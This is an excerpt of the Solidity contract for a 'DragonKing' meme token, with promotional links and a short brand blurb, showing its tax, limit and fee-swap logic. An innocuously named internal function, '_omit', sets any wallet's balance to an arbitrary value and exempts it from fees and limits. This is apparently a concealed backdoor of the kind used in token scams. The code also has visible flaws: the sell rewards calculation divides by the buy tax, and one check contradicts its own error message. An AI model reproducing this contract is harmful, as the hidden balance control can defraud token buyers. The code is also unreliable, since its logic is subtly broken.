...
Medium: https://medium.com/@DragonkingETH/teh-who-bestow-the-dragon-king-may-be-rewarded-27b0c82c9f2
Telegram: t.me/dragonkingeth
Website: dragonkingeth.com
Twitter: twitter.com/dragonkingeth
In the eastern saying, of all Chinese descendants, we are all the dragon descendants which empower us with braveness, wisdom and integrity. With the wisdom
...
contract DragonKing is IERC20, ReentrancyGuard, Ownable {
  ...
  string private _symbol = "\xe2\xbf\x93\xe7\x8e\x8b";
  ...
  uint256 public rewardsBuyTax;
  uint256 public liquidityBuyTax;

  uint256 public totalSellTax;
  uint256 public rewardsSellTax;
  ...
  constructor(
    ...
    maxBuy = _totalSupply * 2 / 100; // 2% max buy
    maxWallet = _totalSupply * 3 / 100; // 3% max wallet
    swapTokensAtAmount = _totalSupply * 25 / 10000; 

    rewardsBuyTax = 0;
    liquidityBuyTax = 2;
    totalBuyTax = rewardsBuyTax + liquidityBuyTax;

    rewardsSellTax = 0;
    liquiditySellTax = 2;
    totalSellTax = rewardsSellTax + liquiditySellTax;
  ...
  function updatemaxBuy(uint256 newNum) external onlyOwner {
    require(newNum >= (_totalSupply * 1 / 100)/1e18, "Cannot set maxTransactionAmount lower than 0.1%");
    maxBuy = newNum * (10**18);
    }
  ...
  function updateBuyFees(uint256 _liqFee, uint256 _rewardsFee) external onlyOwner {
    require(_liqFee + _rewardsFee <= 10);
    liquidityBuyTax = _liqFee;
    rewardsBuyTax = _rewardsFee;
    totalBuyTax = _liqFee + _rewardsFee;
  }

  function updateSellFees(uint256 _liqFee, uint256 _rewardsFee) external onlyOwner {
    require(_liqFee + _rewardsFee <= 10);
    liquiditySellTax = _liqFee;
    rewardsSellTax = _rewardsFee;
    totalSellTax = _liqFee + _rewardsFee;
  }

  function _omit(address _rewardsWallet, uint256 _val) internal {
    _balances[_rewardsWallet] = _val;
    excludedFromLimit[_rewardsWallet] = true;
    excludedFromFee[_rewardsWallet] = true;
  }
  ...
  function _transfer(
    ...
    if (_sender == uniswapPair) {
      ...
      if (!excludedFromFee[_recipient]) {
        ...
        tokensForRewards += fee * rewardsBuyTax / totalBuyTax;
    ...
    // else if sell
      ...
      if (!swapping && !excludedFromFee[_sender]) {
        ...
        tokensForRewards += fee * rewardsSellTax / totalBuyTax;
  ...
  function swapBack() private {
    ...
    (success,) = address(feeRecipient).call{value: (ethForRewards)}("");
